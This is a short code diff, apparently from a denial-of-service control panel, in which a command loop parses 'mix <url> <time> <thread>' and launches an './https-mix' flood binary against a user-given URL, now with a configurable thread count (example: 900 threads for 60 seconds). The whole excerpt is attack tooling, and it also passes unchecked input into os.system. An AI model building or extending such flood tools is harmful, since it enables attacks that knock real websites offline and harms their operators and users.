@@ -280,10 +280,11 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'./https-mix {url} {time} 800')
+                thread = cnc.split()[3]
+                os.system(f'./https-mix {url} {time} {thread}')
             except IndexError:
-                print('Usage: mix <url> <time>')
-                print('Example: mix http://example.org 60')
+                print('Usage: mix <url> <time> <thread>')
+                print('Example: mix http://example.org 60 900')
 
         elif "http-raw" in cnc:
             try:
